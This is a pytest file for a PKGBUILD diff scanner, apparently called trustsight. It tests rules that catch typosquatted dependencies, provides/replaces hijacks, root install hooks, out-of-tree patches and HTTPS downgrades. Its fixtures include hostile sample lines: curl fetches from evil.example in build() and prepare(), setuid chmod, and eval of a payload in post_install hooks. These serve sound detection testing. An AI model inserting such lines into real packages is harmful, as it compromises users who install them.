"""D-series and R060/R061.

Every "must not fire" case here was an observed false positive when the
D001 fire rate was measured against the 3246-diff benign corpus, so they
are regressions rather than hypotheticals.
"""

import copy

import pytest

from trustsight.analysis import scan_diff
from trustsight.config import ensure_default_configs, load_config
from trustsight.db import init_db, record_dependency_names
from trustsight.deps import (
    extract_dependency_changes,
    is_ignorable,
    normalize_dependency,
)
from trustsight.differ import extract_source_array_urls
from trustsight.novelty import typosquat_target
from trustsight.rules import load_rules

HEADER = "--- a/PKGBUILD\n+++ b/PKGBUILD\n"

KNOWN = ["glibc", "curl", "openssl", "cmake", "python-requests", "ffmpeg", "sudo"]


@pytest.fixture(scope="module")
def rules():
    ensure_default_configs()
    return load_rules()


@pytest.fixture
def enabled():
    ensure_default_configs()
    config = copy.deepcopy(load_config())
    config["experimental_rules"] = {
        r: True for r in ("D001", "D002", "D003", "R060", "R061")
    }
    return config


@pytest.fixture
def disabled():
    ensure_default_configs()
    return load_config()


def fired(diff, config, rules, package="mypkg"):
    fact = scan_diff(diff, rules=rules, config=config, package_name=package)
    return {e.rule_id for e in fact.score_breakdown}


# --- normalisation ---

@pytest.mark.parametrize("raw,expected", [
    ("python-requests>=2.0", "python-requests"),
    ("glibc=2.3", "glibc"),
    ("ffmpeg: for video export", "ffmpeg"),
    ("'curl'", "curl"),
    ("libfoo.so=1-64", "libfoo.so"),
])
def test_normalize_dependency(raw, expected):
    assert normalize_dependency(raw) == expected


# --- false positives measured against the benign corpus ---

@pytest.mark.parametrize("name", [
    "$_pkgname",            # linux-cachyos, kwin-effect-rounded-corners-git
    "${pkgbase}",
    "libwlroots-0.21.so",   # mangowm-wlonly-git
])
def test_unresolvable_and_soname_names_are_ignored(name):
    assert is_ignorable(name, "mypkg")


def test_companion_split_package_is_ignored():
    """jellyfin-desktop-git depending on jellyfin-desktop-libcef-bin."""
    assert is_ignorable("jellyfin-desktop-libcef-bin", "jellyfin-desktop-git")


def test_unrelated_name_is_not_ignored():
    assert not is_ignorable("python-granian", "jellyfin-desktop-git")


def test_rewrapping_an_array_adds_nothing():
    """A re-indented array must not read as though every dep were new."""
    diff = HEADER + (
        "-depends=('glibc' 'curl')\n"
        "+depends=(\n+  'glibc'\n+  'curl'\n+)\n"
    )
    assert extract_dependency_changes(diff, "mypkg")["depends"] == set()


def test_shell_after_an_array_is_not_read_as_dependencies():
    """Measured regression: an unbounded fallback read `if`, `[[`, and `!`
    out of a package() body as dependency names, taking D001 from 0.5% to
    6% of the benign corpus."""
    diff = HEADER + (
        "+optdepends=('firefox: browser')\n"
        "+package() {\n+  if [[ ! -f x ]]; then\n+    echo hi\n+  fi\n+}\n"
    )
    added = extract_dependency_changes(diff, "mypkg")
    # The real optdepend is picked up; the shell body that follows is not.
    assert added["optdepends"] == {"firefox"}
    assert not (added["depends"] | added["makedepends"] | added["checkdepends"])


def test_comments_inside_an_array_are_not_dependencies():
    """Measured regression: maintainers annotate dependency arrays, and every
    word of the note was read as a dependency name ('required', 'because',
    'disabled', 'not')."""
    diff = HEADER + (
        "+makedepends=(\n"
        "+  krisp   # required because the bundled one is disabled\n"
        "+  cmake\n"
        "+)\n"
    )
    assert extract_dependency_changes(diff, "mypkg")["makedepends"] == {"krisp", "cmake"}


def test_paren_in_a_quoted_description_does_not_end_the_array():
    diff = HEADER + (
        "+optdepends=(\n"
        "+  'foo: (optional) thing'\n"
        "+  'realdep: another'\n"
        "+)\n"
    )
    assert extract_dependency_changes(diff, "mypkg")["optdepends"] == {"foo", "realdep"}


@pytest.mark.parametrize("token", ["!", "[[", "^[[", "$(", "-"])
def test_shell_fragments_are_not_package_names(token):
    from trustsight.deps import _is_package_name
    assert not _is_package_name(token)


def test_multiline_array_addition_is_found():
    diff = HEADER + " depends=(\n   'glibc'\n+  'newdep'\n )\n"
    assert extract_dependency_changes(diff, "mypkg")["depends"] == {"newdep"}


# --- typosquatting ---

@pytest.mark.parametrize("name,target", [
    ("openss1", "openssl"),
    ("cur1", "curl"),
    ("pyhton-requests", "python-requests"),   # transposition
])
def test_typosquat_detected(name, target):
    assert typosquat_target(name, KNOWN + ["python-requests"]) == target


def test_short_names_are_not_typosquat_candidates():
    """`yay` is one edit from yak, yam, jay, and may, all real packages."""
    assert typosquat_target("yak", ["yay"]) is None


def test_unrelated_name_is_not_a_typosquat():
    assert typosquat_target("totally-unrelated-name", KNOWN) is None


# --- R061 source-array scoping ---

def test_source_array_urls_exclude_build_downloads():
    """The whole point of the scoped extractor: a curl URL in build() is
    not a declared source, so it must not appear here."""
    diff = HEADER + (
        "+source=('https://good.example/a.tar.gz')\n"
        "+build() {\n+  curl https://evil.example/x.sh -o x\n+}\n"
    )
    urls = extract_source_array_urls(diff)
    assert urls == {"https://good.example/a.tar.gz"}


# --- D001/D002 end to end, against an isolated seeded database ---

@pytest.fixture
def seeded_db(tmp_path, monkeypatch):
    monkeypatch.setattr("trustsight.db.DATA_DIR", tmp_path)
    init_db()
    record_dependency_names(KNOWN * 10)
    yield


def test_d001_fires_on_globally_unknown_dependency(seeded_db, enabled, rules):
    diff = HEADER + "+depends=('glibc' 'totally-unknown-backdoor')\n"
    assert "D001" in fired(diff, enabled, rules)


def test_d001_silent_on_known_dependencies(seeded_db, enabled, rules):
    diff = HEADER + "-depends=('glibc')\n+depends=('glibc' 'curl')\n"
    assert "D001" not in fired(diff, enabled, rules)


def test_d002_supersedes_d001_for_a_typosquat(seeded_db, enabled, rules):
    """A typosquat is also novel; reporting it as D001 would lose the
    reason it matters."""
    ids = fired(HEADER + "+depends=('glibc' 'openss1')\n", enabled, rules)
    assert "D002" in ids and "D001" not in ids


def test_d001_silent_without_a_seeded_corpus(tmp_path, monkeypatch, enabled, rules):
    """An unseeded database must not make every dependency look novel."""
    monkeypatch.setattr("trustsight.db.DATA_DIR", tmp_path)
    init_db()
    diff = HEADER + "+depends=('glibc' 'totally-unknown-backdoor')\n"
    assert "D001" not in fired(diff, enabled, rules)


# --- end to end ---

def test_rules_are_silent_when_disabled(disabled, rules):
    diff = HEADER + "+depends=('glibc' 'totally-unknown-backdoor')\n"
    assert fired(diff, disabled, rules) == set()


def test_d003_fires_on_new_network_makedepends(enabled, rules):
    diff = HEADER + "-makedepends=('cmake')\n+makedepends=('cmake' 'curl')\n"
    assert "D003" in fired(diff, enabled, rules)


def test_d003_silent_when_network_tool_already_present(enabled, rules):
    diff = HEADER + "-makedepends=('curl')\n+makedepends=('curl' 'cmake')\n"
    assert "D003" not in fired(diff, enabled, rules)


def test_r060_fires_on_build_function_change(enabled, rules):
    diff = HEADER + "+build() {\n+  make\n+}\n"
    assert "R060" in fired(diff, enabled, rules)


def test_r060_silent_on_metadata_only_change(enabled, rules):
    diff = HEADER + "-pkgver=1.0\n+pkgver=1.1\n"
    assert "R060" not in fired(diff, enabled, rules)


def test_r061_fires_on_undeclared_download(enabled, rules):
    diff = HEADER + (
        "+source=('https://good.example/a.tar.gz')\n"
        "+build() {\n+  curl https://evil.example/x.sh -o x\n+}\n"
    )
    assert "R061" in fired(diff, enabled, rules)


def test_r061_silent_when_url_is_declared(enabled, rules):
    """A legitimate fetch of something already in source=() must not fire."""
    diff = HEADER + (
        "+source=('https://good.example/a.tar.gz')\n"
        "+build() {\n+  curl https://good.example/a.tar.gz -o a\n+}\n"
    )
    assert "R061" not in fired(diff, enabled, rules)


def test_r060_is_info_and_cannot_move_a_score(rules):
    """It fires on 21.4% of benign diffs, so it must contribute nothing."""
    ensure_default_configs()
    config = load_config()
    diff = HEADER + "+build() {\n+  make\n+}\n"
    fact = scan_diff(diff, rules=rules, config=config, package_name="mypkg")
    entries = {e.rule_id: e for e in fact.score_breakdown}
    assert entries["R060"].severity == "INFO"
    assert entries["R060"].weight == 0
    assert fact.final_score == 0


def test_r060_defaults_on_for_a_config_without_the_section(rules):
    """load_config() never merges defaults into an existing config.toml, so
    the fallback has to live in code or R060 is dead for every upgrade."""
    diff = HEADER + "+build() {\n+  make\n+}\n"
    fact = scan_diff(diff, rules=rules, config={}, package_name="mypkg")
    assert "R060" in {e.rule_id for e in fact.score_breakdown}


def test_scoring_rules_stay_off_for_a_config_without_the_section(rules):
    diff = HEADER + "+depends=('glibc' 'totally-unknown-backdoor')\n"
    fact = scan_diff(diff, rules=rules, config={}, package_name="mypkg")
    assert not {"D001", "D002", "D003", "R061"} & {e.rule_id for e in fact.score_breakdown}


# --- D004: provides/replaces hijack ---

@pytest.fixture
def all_enabled(enabled):
    enabled["experimental_rules"].update(
        {"D004": True, "R062": True, "R063": True, "R064": True}
    )
    return enabled


def test_d004_fires_on_unrelated_established_package(seeded_db, all_enabled, rules):
    assert "D004" in fired(HEADER + "+provides=('openssl')\n", all_enabled, rules)


def test_d004_fires_on_replaces(seeded_db, all_enabled, rules):
    assert "D004" in fired(HEADER + "+replaces=('sudo')\n", all_enabled, rules)


@pytest.mark.parametrize("pkg,provided", [
    ("htop-vim", "htop"),
    ("lmstudio-bin", "lmstudio"),
    ("localsend-bin", "localsend"),
])
def test_d004_silent_for_a_variant_of_the_same_project(all_enabled, rules, pkg, provided):
    """The ordinary pattern, and every provides/replaces hit in the corpus."""
    diff = HEADER + f"+provides=('{provided}')\n"
    assert "D004" not in fired(diff, all_enabled, rules, package=pkg)


def test_d004_silent_for_a_soname(all_enabled, rules):
    diff = HEADER + "+provides=('libfoo.so=1-64')\n"
    assert "D004" not in fired(diff, all_enabled, rules)


# --- R062: install hooks run as root ---

@pytest.mark.parametrize("body", [
    "chmod u+s /usr/bin/x",
    "systemctl enable --now evil.service",
    "eval \"$payload\"",
])
def test_r062_fires_on_privileged_hook_body(all_enabled, rules, body):
    diff = HEADER + f"+post_install() {{\n+  {body}\n+}}\n"
    assert "R062" in fired(diff, all_enabled, rules)


def test_r062_silent_when_the_match_is_only_a_comment(all_enabled, rules):
    """One of the four corpus hits was `# systemctl enable input-remapper`."""
    diff = HEADER + "+post_install() {\n+  # systemctl enable foo\n+}\n"
    assert "R062" not in fired(diff, all_enabled, rules)


def test_r062_silent_on_a_benign_hook(all_enabled, rules):
    diff = HEADER + "+post_install() {\n+  echo 'run foo to configure'\n+}\n"
    assert "R062" not in fired(diff, all_enabled, rules)


# --- R063: patch input from outside the build tree ---

@pytest.mark.parametrize("cmd", [
    "patch -p1 -i /tmp/x.patch",
    "patch -p1 < <(curl https://evil.example/x.patch)",
])
def test_r063_fires_on_untrusted_patch_input(all_enabled, rules, cmd):
    diff = HEADER + f"+prepare() {{\n+  {cmd}\n+}}\n"
    assert "R063" in fired(diff, all_enabled, rules)


def test_r063_silent_for_a_patch_from_srcdir(all_enabled, rules):
    """A patch in $srcdir may have come from the tarball, which is why the
    rule checks where the input comes from rather than whether it is
    declared in source=()."""
    diff = HEADER + '+prepare() {\n+  patch -p1 -i "$srcdir/fix.patch"\n+}\n'
    assert "R063" not in fired(diff, all_enabled, rules)


# --- R064: protocol downgrade ---

def test_r064_fires_on_https_to_http(all_enabled, rules):
    diff = HEADER + (
        "-source=('https://e.example/a.tar.gz')\n"
        "+source=('http://e.example/a.tar.gz')\n"
    )
    assert "R064" in fired(diff, all_enabled, rules)


def test_r064_silent_when_url_was_already_http(all_enabled, rules):
    diff = HEADER + (
        "-source=('http://e.example/a.tar.gz')\n"
        "+source=('http://e.example/b.tar.gz')\n"
    )
    assert "R064" not in fired(diff, all_enabled, rules)


def test_r064_silent_on_an_upgrade_to_https(all_enabled, rules):
    diff = HEADER + (
        "-source=('http://e.example/a.tar.gz')\n"
        "+source=('https://e.example/a.tar.gz')\n"
    )
    assert "R064" not in fired(diff, all_enabled, rules)


def test_new_rules_are_silent_by_default(rules):
    ensure_default_configs()
    config = load_config()
    for diff in (
        HEADER + "+provides=('openssl')\n",
        HEADER + "+post_install() {\n+  chmod u+s /usr/bin/x\n+}\n",
        HEADER + "+prepare() {\n+  patch -p1 -i /tmp/x.patch\n+}\n",
        HEADER + "-source=('https://e.example/a.tar.gz')\n+source=('http://e.example/a.tar.gz')\n",
    ):
        assert not {"D004", "R062", "R063", "R064"} & fired(diff, config, rules)


@pytest.mark.parametrize("rule_id,diff", [
    ("D004", HEADER + "+provides=('openssl')\n"),
    ("D002", HEADER + "+depends=('openss1')\n"),
    ("D003", HEADER + "-makedepends=('cmake')\n+makedepends=('cmake' 'curl')\n"),
    ("R062", HEADER + "+post_install() {\n+  chmod u+s /usr/bin/x\n+}\n"),
    ("R063", HEADER + "+prepare() {\n+  patch -p1 -i /tmp/x.patch\n+}\n"),
    ("R064", HEADER + "-source=('https://e.example/a.tar.gz')\n"
                      "+source=('http://e.example/a.tar.gz')\n"),
])
def test_each_rule_works_when_enabled_alone(seeded_db, rules, rule_id, diff):
    """D004 shared a guard clause that only tested D001-D003, so enabling it
    on its own silently did nothing."""
    ensure_default_configs()
    config = copy.deepcopy(load_config())
    config["experimental_rules"] = {rule_id: True}
    assert rule_id in fired(diff, config, rules)


@pytest.mark.parametrize("pkg,provided", [
    ("linux-cachyos", "linux-headers"),      # custom kernel provides headers
    ("mutter-hdr-update", "mutter-devkit"),  # sibling of the same project
])
def test_d004_silent_for_a_sibling_package(all_enabled, rules, pkg, provided):
    """Measured regression: these three were D004's only corpus hits, all
    false positives.  Neither name is a prefix of the other, so relatedness
    also has to accept a shared leading token."""
    diff = HEADER + f"+provides=('{provided}')\n"
    assert "D004" not in fired(diff, all_enabled, rules, package=pkg)


@pytest.mark.parametrize("pkg,provided", [
    ("python-evil", "python-requests"),
    ("ttf-evil", "ttf-liberation"),
    ("r-evil", "r-mass"),
])
def test_d004_still_fires_across_an_ecosystem_prefix(rules, pkg, provided):
    """A shared `python-` says nothing about a common project, so the
    sibling rule must not suppress a hijack inside an ecosystem."""
    from trustsight.deps import is_related_package
    assert not is_related_package(provided, pkg)
